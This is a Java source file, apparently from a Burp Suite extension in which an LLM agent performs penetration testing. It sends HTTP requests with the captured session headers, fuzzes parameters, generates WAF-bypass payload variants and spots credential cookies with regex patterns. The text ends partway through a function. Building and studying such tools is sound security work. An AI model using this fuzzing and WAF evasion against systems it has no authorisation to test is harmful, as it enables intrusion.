package com.burpai.aipentester;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.sitemap.SiteMapFilter;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.BiConsumer;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import static burp.api.montoya.http.message.HttpHeader.httpHeader;

/**
 * Executes all agent tools: HTTP requests, fuzzing, spidering, encoding,
 * variable management, response searching, site-map querying, etc.
 */
class ToolExecutor {

  private final MontoyaApi api;
  private final ObjectMapper json;
  private final AgentLogger logger;
  private final List<Map<String, Object>> vulnStore;
  private final Map<Integer, String> responseBodyStore;
  private final Map<Integer, HttpRequestResponse> rrStore;
  private final Map<String, String> sessionVars;
  private final BiConsumer<AgentTab.LogRow, HttpRequestResponse> addRow;
  private final Consumer<HttpRequestResponse> showEditors;
  private final AtomicInteger counter;
  private final CollaboratorManager collaborator;

  /** Set at the start of each run; may be null between runs. */
  volatile MemoryManager runMemory;

  /** Current vulnerability class being tested — defaults to "general". */
  private volatile String currentVulnClass = VulnClass.GENERAL;

  /**
   * Auth/session headers extracted from the imported request.
   * Auto-injected into every agent-fired HTTP request so that the LLM does not need
   * to re-specify Authorization or Cookie on every tool call.
   * LLM-provided headers take precedence (applied after these).
   */
  private volatile Map<String, String> importedAuthHeaders = Collections.emptyMap();

  /** Headers managed by Burp or the HTTP layer — never copy from the imported request. */
  private static final Set<String> IMPORTED_HEADERS_SKIP = Set.of(
      "host", "content-length", "transfer-encoding", "connection", "content-encoding");

  // ── Lightweight credential patterns for imported-cookie analysis ──────────
  // Duplicated here (vs AgentLoop) so ToolExecutor stays self-contained.
  private static final Pattern JWT_QUICK  = Pattern.compile("eyJ[A-Za-z0-9_-]+\\.eyJ");
  private static final Pattern UUID_QUICK = Pattern.compile(
      "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}");
  private static final Pattern HEX_QUICK  = Pattern.compile("[0-9a-fA-F]{32,}");
  private static final Pattern OPAQ_QUICK = Pattern.compile("[A-Za-z0-9+/=_~.-]{28,}");
  /** Cookie name keywords that suggest the cookie carries a credential. */
  private static final Set<String> COOKIE_AUTH_KW = Set.of(
      "auth", "token", "jwt", "bearer", "credential", "secret",
      "session", "sess", "apikey", "api_key", "nonce", "hmac",
      "signature", "ticket", "sid", "ssid", "oauth", "identity", "access");

  void setCurrentVulnClass(String vulnClass) {
    this.currentVulnClass = (vulnClass == null || vulnClass.isBlank())
        ? VulnClass.GENERAL : vulnClass;
  }

  /**
   * Captures the auth/session headers from the imported request so they are
   * automatically propagated to every subsequent HTTP request fired by the agent.
   * Call this after {@link #reset()} at the start of each run.
   */
  void setImportedHeaders(Map<String, String> headers) {
    if (headers == null || headers.isEmpty()) {
      importedAuthHeaders = Collections.emptyMap();
      return;
    }
    Map<String, String> filtered = new LinkedHashMap<>();
    for (var e : headers.entrySet()) {
      if (e.getKey() != null
          && !IMPORTED_HEADERS_SKIP.contains(e.getKey().toLowerCase(Locale.ROOT))) {
        filtered.put(e.getKey(), e.getValue());
      }
    }
    importedAuthHeaders = Collections.unmodifiableMap(filtered);
    if (!filtered.isEmpty()) {
      logger.log("[DEBUG] Imported session headers will be propagated: "
          + filtered.keySet() + "\n");
    }

    // ── Pre-compute _cookie_no_<name> session vars ────────────────────────────
    // For every credential-looking cookie in the imported Cookie header, store a
    // ready-made cookie string with that individual cookie removed so the LLM
    // can test unauthenticated-cookie scenarios via {{_cookie_no_<cookieName>}}
    // without having to reconstruct the full cookie string manually.
    for (var e : filtered.entrySet()) {
      if (!"cookie".equals(e.getKey().toLowerCase(Locale.ROOT))) continue;
      String cookieHdr = e.getValue();
      if (cookieHdr == null || cookieHdr.isBlank()) continue;
      String[] parts = cookieHdr.split(";");
      for (String part : parts) {
        String[] kv = part.trim().split("=", 2);
        if (kv.length < 2) continue;
        String cName   = kv[0].trim();
        String cVal    = kv[1].trim();
        if (cVal.isBlank()) continue;
        String cNameLc = cName.toLowerCase(Locale.ROOT);

        boolean isCsrf       = cNameLc.contains("csrf") || cNameLc.contains("xsrf");
        boolean nameIsAuth   = !isCsrf && COOKIE_AUTH_KW.stream().anyMatch(cNameLc::contains);
        boolean valIsCredential = JWT_QUICK .matcher(cVal).find()
                                || UUID_QUICK.matcher(cVal).find()
                                || HEX_QUICK .matcher(cVal).find()
                                || (OPAQ_QUICK.matcher(cVal).matches() && !cVal.contains(" "));

        if (!nameIsAuth && !valIsCredential) continue;

        // Build cookie string with this entry removed.
        String stripped = Arrays.stream(parts)
            .map(String::trim)
            .filter(p -> !p.isEmpty() && !p.toLowerCase(Locale.ROOT).startsWith(cNameLc + "="))
            .collect(Collectors.joining("; "));
        sessionVars.put("_cookie_no_" + cName, stripped);
        logger.log("[DEBUG] Pre-computed {{_cookie_no_" + cName + "}} = "
            + AgentUtils.truncate(stripped, 80) + "\n");
      }
    }
  }

  ToolExecutor(MontoyaApi api,
               ObjectMapper json,
               AgentLogger logger,
               List<Map<String, Object>> vulnStore,
               Map<Integer, String> responseBodyStore,
               Map<Integer, HttpRequestResponse> rrStore,
               Map<String, String> sessionVars,
               BiConsumer<AgentTab.LogRow, HttpRequestResponse> addRow,
               Consumer<HttpRequestResponse> showEditors,
               AtomicInteger counter,
               CollaboratorManager collaborator) {
    this.api = api;
    this.json = json;
    this.logger = logger;
    this.vulnStore = vulnStore;
    this.responseBodyStore = responseBodyStore;
    this.rrStore = rrStore;
    this.sessionVars = sessionVars;
    this.addRow = addRow;
    this.showEditors = showEditors;
    this.counter = counter;
    this.collaborator = collaborator;
  }

  // ─────────────────────── Per-run reset ────────────────────────────────────

  /** Clear all per-run stores. Called by {@link AgentLoop} at the start of every run. */
  void reset() {
    responseBodyStore.clear();
    rrStore.clear();
    sessionVars.clear();
    runMemory = null;
    importedAuthHeaders = Collections.emptyMap();
    collaborator.reset();
  }

  // ─────────────────────── execute_http_request ────────────────────────────

  ToolResult executeHttpRequest(String targetBase,
                                String method,
                                String endpointOrUrl,
                                Map<String, String> headers,
                                String body,
                                String purpose,
                                String expected) {
    try {
      String fullUrl = AgentUtils.toAbsolute(targetBase, endpointOrUrl);
      long startNs = System.nanoTime();

      HttpRequest req = HttpRequest.httpRequestFromUrl(fullUrl).withMethod(method);

      // Expand {{session_vars}} in every LLM-provided header value before sending.
      // This resolves placeholders like {{jwt_none_header}}.{{jwt_payload}}. that the LLM
      // builds up via set_variable tool calls.
      Map<String, String> expandedHeaders = new LinkedHashMap<>();
      if (headers != null) {
        for (var e : headers.entrySet()) {
          expandedHeaders.put(e.getKey(), expandVars(e.getValue()));
        }
      }

      // Determine which header names the LLM explicitly controls (case-insensitive).
      // An EMPTY/BLANK value is the LLM's SUPPRESS signal:
      //   • the imported version of that header is withheld
      //   • the empty header itself is NOT sent (no "Authorization: " noise)
      // This lets the LLM test "no auth" by passing {"Authorization": ""} without
      // having to know or modify the Cookie header independently.
      Set<String> llmControlled = new HashSet<>();
      for (String k : expandedHeaders.keySet()) {
        if (k != null) llmControlled.add(k.toLowerCase(Locale.ROOT));
      }

      // Apply imported auth/session headers — skip any the LLM explicitly controls.
      for (var e : importedAuthHeaders.entrySet()) {
        if (!llmControlled.contains(e.getKey().toLowerCase(Locale.ROOT))) {
          req = req.withHeader(httpHeader(e.getKey(), e.getValue()));
        }
      }

      // Apply LLM-provided headers.
      // Blank value = SUPPRESS: header is intentionally omitted from the request.
      for (var e : expandedHeaders.entrySet()) {
        if (e.getValue() != null && !e.getValue().isBlank()) {
          req = req.withHeader(httpHeader(e.getKey(), e.getValue()));
        }
        // blank: header is suppressed — imported version already blocked above
      }
      if (body != null && !body.isEmpty()) {
        req = req.withBody(body);
      }

      logger.log("[DEBUG] Sending request: " + method + " " + fullUrl + "\n");
      HttpRequestResponse rr = api.http().sendRequest(req);

      int status = rr.response() != null ? rr.response().statusCode() : 0;
      int id = counter.incrementAndGet();

      addRow.accept(new AgentTab.LogRow(id, method, fullUrl, status, purpose), rr);
      showEditors.accept(rr);

      logger.log("Executing: " + method + " " + fullUrl + "\n");
      logger.log(" Purpose: " + purpose + "\n");
      logger.log(" Expected: " + expected + "\n");
      logger.log(" Status: " + status + "\n\n");

      long durationMs = (System.nanoTime() - startNs) / 1_000_000L;

      Map<String, String> reqHeaders = new LinkedHashMap<>();
      try {
        if (rr.request() != null) {
          for (HttpHeader h : rr.request().headers()) reqHeaders.putIfAbsent(h.name(), h.value());
        }
      } catch (Exception ignored) {}

      String requestBodyPreview = null;
      try {
        if (rr.request() != null) requestBodyPreview = AgentUtils.truncate(rr.request().bodyToString(), 2000);
      } catch (Exception ignored) {}

      Map<String, List<String>> respHeaders = new LinkedHashMap<>();
      try {
        if (rr.response() != null) {
          for (HttpHeader h : rr.response().headers()) {
            respHeaders.computeIfAbsent(h.name(), k -> new ArrayList<>()).add(h.value());
          }
        }
      } catch (Exception ignored) {}

      String respBody = (rr.response() != null) ? rr.response().bodyToString() : "";
      boolean likelyBinary = AgentUtils.looksBinary(respBody);
      String responseBodyPreview = AgentUtils.truncate(respBody, 4000);

      responseBodyStore.put(id, respBody);
      rrStore.put(id, rr);

      if (runMemory != null) {
        runMemory.recordHttp(id, method, fullUrl, status, purpose,
            requestBodyPreview, responseBodyPreview, respHeaders);

        // AttackGraph updates
        AttackGraph graph = runMemory.getAttackGraph();
        graph.upsertEndpoint(fullUrl);
        graph.addMethod(fullUrl, method);
        if (status == 401 || status == 403) {
          graph.setAuthRequired(fullUrl, true);
        }
      }

      return ToolResult.ok(id, method, fullUrl, reqHeaders, requestBodyPreview,
          status, respHeaders, responseBodyPreview, likelyBinary, durationMs);

    } catch (Exception ex) {
      api.logging().logToError("executeHttpRequest failed: " + ex);
      return ToolResult.error(method, endpointOrUrl, ex.getMessage());
    }
  }

  // ─────────────────────── Burp native issue reporting ───────────────────────

  /**
   * Builds a Montoya {@link AuditIssue} from a vuln-store map and pushes it to
   * {@code api.siteMap().add()} so it appears in the Burp Dashboard and Issue Activity.
   *
   * @param args      the same map that was (or will be) stored in vulnStore
   * @param confirmed {@code true} → CERTAIN confidence (PoC-confirmed);
   *                  {@code false} → TENTATIVE (observed, not fully proven)
   */
  void reportAuditIssue(Map<String, Object> args, boolean confirmed) {
    try {
      String name        = AgentUtils.str(args.getOrDefault("name",        "Unknown Finding"));
      String description = AgentUtils.str(args.getOrDefault("description", ""));
      String impact      = AgentUtils.str(args.getOrDefault("impact",      ""));
      String remediation = AgentUtils.str(args.getOrDefault("remediation", ""));
      String location    = AgentUtils.str(args.getOrDefault("location",    ""));
      String poc         = AgentUtils.str(args.getOrDefault("poc",         ""));
      String sevStr      = AgentUtils.str(args.getOrDefault("severity",    "Information")).trim();

      AuditIssueSeverity severity = switch (sevStr.toUpperCase(Locale.ROOT)) {
        case "CRITICAL", "HIGH" -> AuditIssueSeverity.HIGH;
        case "MEDIUM"           -> AuditIssueSeverity.MEDIUM;
        case "LOW"              -> AuditIssueSeverity.LOW;
        default                 -> AuditIssueSeverity.INFORMATION;
      };
      AuditIssueConfidence confidence = confirmed
          ? AuditIssueConfidence.CERTAIN : AuditIssueConfidence.TENTATIVE;

      // Build HTML detail block
      StringBuilder detail = new StringBuilder();
      if (!description.isBlank()) detail.append("<p><b>Description:</b> ").append(escHtml(description)).append("</p>");
      if (!impact.isBlank())      detail.append("<p><b>Impact:</b> ")     .append(escHtml(impact))     .append("</p>");
      if (!poc.isBlank())         detail.append("<p><b>PoC:</b></p><pre>").append(escHtml(poc))        .append("</pre>");

      String remediationHtml = remediation.isBlank() ? null
          : "<p>" + escHtml(remediation) + "</p>";

      // Resolve evidence request/response objects
      List<HttpRequestResponse> evidence = new ArrayList<>();
      Object ids = args.get("evidence_request_ids");
      if (ids instanceof List<?> list) {
        for (Object o : list) {
          try {
            HttpRequestResponse rr = rrStore.get(((Number) o).intValue());
            if (rr != null) evidence.add(rr);
          } catch (Exception ignored) {}
        }
      }

      // Determine baseUrl: prefer first evidence request URL, fall back to location
      String baseUrl = null;
      if (!evidence.isEmpty() && evidence.get(0).request() != null) {
        try { baseUrl = evidence.get(0).request().url(); } catch (Exception ignored) {}
      }
      if (baseUrl == null || baseUrl.isBlank()) baseUrl = location;

      // Burp's AuditIssue requires a proper HTTP(S) URL. Observed/additional findings
      // often have descriptive locations like "POST /rest/user/login" or "All endpoints"
      // which are not valid URLs. Try to salvage them:
      //   • Strip leading method+space (e.g. "POST /rest/user/login" → "/rest/user/login")
      //   • If it's a bare path, borrow the origin from any stored request
      //   • If it still can't be resolved, skip Dashboard — finding is in HTML report.
      if (!baseUrl.startsWith("http://") && !baseUrl.startsWith("https://")) {
        // Strip leading method word if present ("GET /foo" → "/foo")
        String cooked = baseUrl.replaceFirst("(?i)^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\\s+", "");
        if (cooked.startsWith("/")) {
          // Try to borrow origin from any stored RR
          String origin = rrStore.values().stream()
              .filter(rr -> rr != null && rr.request() != null)
              .map(rr -> { try { return rr.request().url(); } catch (Exception e) { return ""; } })
              .filter(u -> u.startsWith("http"))
              .findFirst()
              .map(u -> { try {
                  java.net.URI uri = new java.net.URI(u);
                  return uri.getScheme() + "://" + uri.getAuthority();
                } catch (Exception e) { return ""; }})
              .orElse("");
          if (!origin.isBlank()) cooked = origin + cooked;
        }
        if (cooked.startsWith("http://") || cooked.startsWith("https://")) {
          baseUrl = cooked;
        } else {
          logger.log("[DEBUG] Burp Dashboard skip for \"" + name + "\" — location \""
              + location + "\" could not be resolved to a URL; finding is in HTML report.\n");
          return;
        }
      }

      AuditIssue issue = AuditIssue.auditIssue(
          name,
          detail.toString(),
          remediationHtml,
          baseUrl,
          severity,
          confidence,
          null,   // background (no per-issue background needed)
          null,   // remediationBackground
          severity,
          evidence);

      api.siteMap().add(issue);
      logger.log("[INFO] Sent to Burp Dashboard: [" + severity.name() + "/"
          + confidence.name() + "] " + name + "\n");

    } catch (Exception ex) {
      logger.log("[WARN] Failed to report to Burp Dashboard: " + ex.getMessage() + "\n");
      api.logging().logToError("reportAuditIssue failed: " + ex);
    }
  }

  /** Minimal HTML escaping for issue detail text. */
  private static String escHtml(String s) {
    if (s == null) return "";
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\n", "<br>");
  }

  // ─────────────────────── report_vulnerability helpers ────────────────────

  static String validateVulnReportArgs(Map<String, Object> args) {
    if (args == null) return "Missing arguments";
    String name = String.valueOf(args.getOrDefault("name", "")).trim();
    String severity = String.valueOf(args.getOrDefault("severity", "")).trim();
    // Reject names that signal a negative / absence finding.
    // Use a targeted regex so legitimate names like "No Rate Limiting on Login Endpoint"
    // or "Broken Authentication — No Account Lockout" are not incorrectly blocked;
    // only phrases of the form "No <thing> found/detected/..." are refused.
    String nameLower = name.toLowerCase(Locale.ROOT);
    boolean isNegative = nameLower.contains("not detected")
        || nameLower.matches("no .*(found|detected|identified|present|vulnerabilit.*|issues?)");
    if (isNegative) {
      return "Do not use report_vulnerability for negative findings; only confirmed vulnerabilities.";
    }
    if (severity.isBlank()) return "Missing severity";
    Object ids = args.get("evidence_request_ids");
    if (!(ids instanceof List<?> list) || list.isEmpty()) {
      return "Missing evidence_request_ids (must reference request log ids from execute_http_request results).";
    }
    return null;
  }

  static String vulnDedupKey(Map<String, Object> args) {
    if (args == null) return "";
    String name = String.valueOf(args.getOrDefault("name", "")).trim().toLowerCase(Locale.ROOT);
    String location = String.valueOf(args.getOrDefault("location", "")).trim().toLowerCase(Locale.ROOT);
    Object ids = args.get("evidence_request_ids");
    String evidence = "";
    if (ids instanceof List<?> list) {
      List<String> parts = new ArrayList<>();
      for (Object o : list) parts.add(String.valueOf(o));
      parts.sort(String::compareTo);
      evidence = String.join(",", parts);
    }
    return name + "|" + location + "|" + evidence;
  }

  // ─────────────────────── Variable expansion ──────────────────────────────

  String expandVars(String s) {
    if (s == null || !s.contains("{{")) return s;
    for (Map.Entry<String, String> e : sessionVars.entrySet()) {
      s = s.replace("{{" + e.getKey() + "}}", e.getValue());
    }
    return s;
  }

  // ─────────────────────── extract_from_response ───────────────────────────

  String toolExtractFromResponse(int requestId, String pattern, int group, String storeAs) throws Exception {
    String body = responseBodyStore.get(requestId);
    if (body == null) {
      return json.writeValueAsString(Map.of("ok", false, "error",
          "No stored response for request_id " + requestId + ". Use an id returned by execute_http_request."));
    }
    if (pattern == null || pattern.isBlank()) {
      return json.writeValueAsString(Map.of("ok", false, "error", "pattern is required"));
    }
    try {
      Matcher m = Pattern.compile(pattern, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(body);
      List<String> matches = new ArrayList<>();
      while (m.find()) { try { matches.add(m.group(group)); } catch (Exception ignored) {} }
      if (matches.isEmpty()) {
        return json.writeValueAsString(Map.of("ok", false, "error", "Pattern not found",
            "pattern", pattern, "response_length", body.length()));
      }
      String first = matches.get(0);
    if (storeAs != null && !storeAs.isBlank()) {
        sessionVars.put(storeAs, first);
        if (runMemory != null) runMemory.recordVarUpdate(storeAs, first);

        // AttackGraph: record extracted variable for the source request URL
        if (runMemory != null) {
          HttpRequestResponse rr = rrStore.get(requestId);
          if (rr != null && rr.request() != null) {
            try {
              runMemory.getAttackGraph().addExtractedVariable(rr.request().url(), storeAs);
            } catch (Exception ignored) {}
          }
        }
      }
      Map<String, Object> out = new LinkedHashMap<>();
      out.put("ok", true);
      out.put("first_match", first);
      out.put("total_matches", matches.size());
      out.put("all_matches", matches.size() <= 20 ? matches : matches.subList(0, 20));
      if (storeAs != null && !storeAs.isBlank()) out.put("stored_as", storeAs);
      return json.writeValueAsString(out);
    } catch (java.util.regex.PatternSyntaxException pse) {
      return json.writeValueAsString(Map.of("ok", false, "error", "Invalid regex: " + pse.getMessage()));
    }
  }

  // ─────────────────────── get_variable ────────────────────────────────────

  String toolGetVariable(String name) throws Exception {
    if (name == null || name.isBlank()) {
      return json.writeValueAsString(Map.of("ok", false, "error", "name is required"));
    }
    String val = sessionVars.get(name);
    if (val == null) {
      Map<String, Object> out = new LinkedHashMap<>();
      out.put("ok", false);
      out.put("error", "Variable '" + name + "' not set");
      out.put("available_variables", new ArrayList<>(sessionVars.keySet()));
      return json.writeValueAsString(out);
    }
    return json.writeValueAsString(Map.of("ok", true, "name", name, "value", val));
  }

  // ─────────────────────── set_variable ────────────────────────────────────

  String toolSetVariable(String name, String value) throws Exception {
    if (name == null || name.isBlank()) {
      return json.writeValueAsString(Map.of("ok", false, "error", "name is required"));
    }
    sessionVars.put(name, value == null ? "" : value);
    if (runMemory != null) runMemory.recordVarUpdate(name, value == null ? "" : value);
    return json.writeValueAsString(Map.of("ok", true, "name", name,
        "value", value == null ? "" : value,
        "all_variables", new ArrayList<>(sessionVars.keySet())));
  }

  // ─────────────────────── fuzz_parameter ──────────────────────────────────

  String toolFuzzParameter(Map<String, Object> args, String targetBase) throws Exception {
    String baseUrl = expandVars(AgentUtils.str(args.getOrDefault("url", "")));
    String method  = AgentUtils.str(args.getOrDefault("method", "GET")).toUpperCase();
    String param   = AgentUtils.str(args.getOrDefault("parameter", ""));
    String location = AgentUtils.str(args.getOrDefault("location", "query")).toLowerCase(Locale.ROOT);
    String bodyTpl  = args.containsKey("body_template") ? expandVars(AgentUtils.str(args.get("body_template"))) : null;
    String urlTpl   = args.containsKey("url_template")  ? expandVars(AgentUtils.str(args.get("url_template")))  : null;

    if (baseUrl.isBlank() && (urlTpl == null || urlTpl.isBlank())) {
      return json.writeValueAsString(Map.of("ok", false, "error", "url is required"));
    }
    if (urlTpl == null && baseUrl.contains("FUZZ")) {
      urlTpl  = baseUrl;
      baseUrl = baseUrl.substring(0, baseUrl.indexOf("FUZZ"));
    }
    if (urlTpl == null && param.isBlank()) {
      return json.writeValueAsString(Map.of("ok", false, "error",
          "parameter is required (or use url_template with FUZZ placeholder)"));
    }
    if (param.isBlank()) param = "FUZZ";

    List<String> payloads = new ArrayList<>();
    Object plObj = args.get("payload_list");
    if (plObj instanceof List<?> pl) {
      for (Object o : pl) payloads.add(String.valueOf(o));
    } else if (plObj instanceof String s) {
      for (String p : s.split(",")) { String t = p.trim(); if (!t.isEmpty()) payloads.add(t); }
    } else {
      return json.writeValueAsString(Map.of("ok", false, "error", "payload_list (array of strings) is required"));
    }
    if (payloads.size() > 25) payloads = payloads.subList(0, 25);

    // AttackGraph: record the parameter name now (during request construction)
    if (runMemory != null && !param.equals("FUZZ") && !baseUrl.isBlank()) {
      runMemory.getAttackGraph().addParameter(baseUrl, param);
    }

    List<Map<String, Object>> results = new ArrayList<>();
    int baseStatus = -1, baseLen = -1;
    long baseDurMs = -1;
    String currentMethod = method;

    for (int i = 0; i < payloads.size(); i++) {
      String payload = expandVars(payloads.get(i));
      String reqUrl  = baseUrl;
      String reqBody = null;
      Map<String, String> reqHdrs = new HashMap<>();
      String mth = currentMethod;

      if (urlTpl != null) {
        String encodedForPath = URLEncoder.encode(payload, StandardCharsets.UTF_8).replace("+", "%20");
        reqUrl = urlTpl.replace("FUZZ", encodedForPath);
      } else switch (location) {
        case "query" -> reqUrl = AgentUtils.setQueryParam(baseUrl, param, payload);
        case "body" -> {
          reqBody = (bodyTpl != null) ? bodyTpl.replace("FUZZ", payload)
              : param + "=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
          if (mth.equals("GET")) mth = "POST";
        }
        case "json_body" -> {
          String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
          reqBody = bodyTpl != null ? bodyTpl.replace("FUZZ", escaped) : "{\"" + param + "\":\"" + escaped + "\"}";
          reqHdrs.put("Content-Type", "application/json");
          if (mth.equals("GET")) mth = "POST";
        }
        case "header" -> reqHdrs.put(param, payload);
        case "path" -> {
          String encodedForPath = URLEncoder.encode(payload, StandardCharsets.UTF_8).replace("+", "%20");
          if (baseUrl.contains("{" + param + "}")) {
            reqUrl = baseUrl.replace("{" + param + "}", encodedForPath);
          } else if (baseUrl.contains(":" + param + "/") || baseUrl.endsWith(":" + param)) {
            reqUrl = baseUrl.replace(":" + param + "/", encodedForPath + "/").replace(":" + param, encodedForPath);
          } else if (baseUrl.contains("FUZZ")) {
            reqUrl = baseUrl.replace("FUZZ", encodedForPath);
          } else {
            reqUrl = AgentUtils.normalizeBase(baseUrl) + "/" + encodedForPath;
          }
        }
        default -> reqUrl = AgentUtils.setQueryParam(baseUrl, param, payload);
      }

      ToolResult tr = executeHttpRequest(targetBase, mth, reqUrl, reqHdrs, reqBody,
          "fuzz[" + i + "] " + param + "=" + AgentUtils.truncate(payload, 40), "*");

      int st  = tr.status != null ? tr.status : 0;
      int len = tr.responseBodyPreview != null ? tr.responseBodyPreview.length() : 0;
      long durMs = tr.durationMs != null ? tr.durationMs : 0;
      if (i == 0) { baseStatus = st; baseLen = len; baseDurMs = durMs; }

      String respSnippet = tr.responseBodyPreview != null ? tr.responseBodyPreview : "";
      boolean wafActive = runMemory != null && runMemory.wafDetected();
      boolean timingAnomaly = durMs > 3000 || (baseDurMs > 0 && durMs > baseDurMs * 3);
      boolean interesting = timingAnomaly
          || AgentUtils.isFuzzInteresting(st, len, baseStatus, baseLen, respSnippet, wafActive);

      Map<String, Object> row = new LinkedHashMap<>();
      row.put("payload", payload);
      row.put("request_id", tr.requestId);
      row.put("status", st);
      row.put("body_length", len);
      row.put("duration_ms", durMs);
      row.put("interesting", interesting);
      if (interesting) {
        List<String> reasons = new ArrayList<>(
            List.of(AgentUtils.fuzzInterestReason(st, len, baseStatus, baseLen, respSnippet, wafActive).split(", ")));
        if (timingAnomaly) {
          reasons.add(0, "timing_anomaly:" + durMs + "ms_vs_baseline:" + baseDurMs + "ms");
        }
        reasons.removeIf(String::isBlank);
        row.put("reason", String.join(", ", reasons));
      }
      results.add(row);
    }

    List<Map<String, Object>> interesting = results.stream()
        .filter(r -> Boolean.TRUE.equals(r.get("interesting")))
        .collect(Collectors.toList());

    // WAF bypass suggestions: when WAF is detected and ALL payloads are uninteresting,
    // generate encoded variants of the top-3 payloads for the agent to retry manually.
    List<String> wafBypassSuggestions = new ArrayList<>();
    boolean wafActive = runMemory != null && runMemory.wafDetected();
    if (wafActive && interesting.isEmpty() && !payloads.isEmpty()) {
      payloads.stream().limit(3).forEach(p ->
          AgentUtils.buildWafBypassVariants(p).forEach(wafBypassSuggestions::add));
    }

    // AttackGraph: mark payload batch complete — called ONCE after all payloads finish
    if (runMemory != null && !baseUrl.isBlank()) {
      runMemory.getAttackGraph().markPayloadTested(baseUrl, currentVulnClass);
    }

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("ok", true);
    out.put("total_payloads", results.size());
    out.put("baseline_status", baseStatus);
    out.put("baseline_body_length", baseLen);
    out.put("interesting_count", interesting.size());
    out.put("interesting_results", interesting);
    out.put("all_results", results);
    if (!wafBypassSuggestions.isEmpty()) {
      out.put("waf_detected", true);
      out.put("waf_bypass_variants",
          "All payloads blocked — retry fuzz_parameter with these encoded variants: " + wafBypassSuggestions);
    }
    return json.writeValueAsString(out);
  }

  // ─────────────────────── decode_encode ───────────────────────────────────

  String toolDecodeEncode(Map<String, Object> args) throws Exception {
    String op    = AgentUtils.str(args.getOrDefault("operation", "")).toLowerCase(Locale.ROOT);
    String input = AgentUtils.str(args.getOrDefault("input", ""));
    if (op.isBlank())    return json.writeValueAsString(Map.of("ok", false, "error", "operation is required"));
    if (input.isBlank()) return json.writeValueAsString(Map.of("ok", false, "error", "input is required"));
    String result;
    try {
      switch (op) {
        case "base64_decode"     -> result = new String(Base64.getDecoder().decode(input.trim()), StandardCharsets.UTF_8);
        case "base64_decode_url" -> result = new String(Base64.getUrlDecoder().decode(input.trim()), StandardCharsets.UTF_8);
        case "base64_encode"     -> result = Base64.getEncoder().encodeToString(input.getBytes(StandardCharsets.UTF_8));
        case "base64_encode_url" -> result = Base64.getUrlEncoder().withoutPadding().encodeToString(input.getBytes(StandardCharsets.UTF_8));
        case "url_decode"        -> result = java.net.URLDecoder.decode(input, StandardCharsets.UTF_8);
        case "url_encode"        -> result = URLEncoder.encode(input, StandardCharsets.UTF_8);
        case "hex_decode" -> {
          String h = input.replaceAll("\\s+", "");
          byte[] bytes = new byte[h.length() / 2];
          for (int i = 0; i < bytes.length; i++) bytes[i] = (byte) Integer.parseInt(h.substring(i * 2, i * 2 + 2), 16);
          result = new String(bytes, StandardCharsets.UTF_8);
        }
        case "hex_encode" -> {
          byte[] b = input.getBytes(StandardCharsets.UTF_8);
          StringBuilder sb = new StringBuilder();
          for (byte bv : b) sb.append(String.format("%02x", bv));
          result = sb.toString();
        }
        case "jwt_decode" -> {
          String[] parts = input.split("\\.");
          if (parts.length < 2) {
            return json.writeValueAsString(Map.of("ok", false, "error",
                "Input does not look like a JWT (expected header.payload.signature)"));
          }
          String hdr = new String(Base64.getUrlDecoder().decode(AgentUtils.padBase64(parts[0])), StandardCharsets.UTF_8);
          String pay = new String(Base64.getUrlDecoder().decode(AgentUtils.padBase64(parts[1])), StandardCharsets.UTF_8);
          Map<String, Object> out = new LinkedHashMap<>();
          out.put("ok", true); out.put("operation", op);
          out.put("header",  json.readValue(hdr, new TypeReference<Map<String, Object>>() {}));
          out.put("payload", json.readValue(pay, new TypeReference<Map<String, Object>>() {}));
          out.put("signature_present", parts.length == 3);
          return json.writeValueAsString(out);
        }
        case "html_decode" -> result = input
            .replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
            .replace("&quot;", "\"").replace("&#39;", "'").replace("&apos;", "'");
        case "html_encode" -> result = input
            .replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace("\"", "&quot;").replace("'", "&#39;");
        default -> {
          return json.writeValueAsString(Map.of("ok", false, "error", "Unknown operation: " + op,
              "supported", List.of("base64_decode", "base64_encode", "base64_decode_url", "base64_encode_url",
                  "url_decode", "url_encode", "hex_decode", "hex_encode", "jwt_decode", "html_decode", "html_encode")));
        }
      }
    } catch (Exception e) {
      return json.writeValueAsString(Map.of("ok", false, "error", "Decode/encode failed: " + e.getMessage()));
    }
    return json.writeValueAsString(Map.of("ok", true, "operation", op, "result", result));
  }

  // ─────────────────────── search_in_response ──────────────────────────────

  String toolSearchInResponse(int requestId, String pattern, int contextLines) throws Exception {
    String body = responseBodyStore.get(requestId);
    if (body == null) {
      return json.writeValueAsString(Map.of("ok", false, "error",
          "No stored response for request_id " + requestId));
    }
    if (pattern == null || pattern.isBlank()) {
      return json.writeValueAsString(Map.of("ok", false, "error", "pattern is required"));
    }
    try {
      Pattern lineP = Pattern.compile(pattern, Pattern.CASE_INSENSITIVE);
      String[] lines = body.split("\n", -1);
      int ctx = Math.max(0, Math.min(contextLines, 5));
      List<Integer> matchLineNums = new ArrayList<>();
      for (int li = 0; li < lines.length; li++) {
        if (lineP.matcher(lines[li]).find()) matchLineNums.add(li);
      }
      List<Map<String, Object>> hits = new ArrayList<>();
      for (int li : matchLineNums) {
        int from = Math.max(0, li - ctx);
        int to   = Math.min(lines.length - 1, li + ctx);
        List<String> ctxBlock = new ArrayList<>();
        for (int j = from; j <= to; j++) {
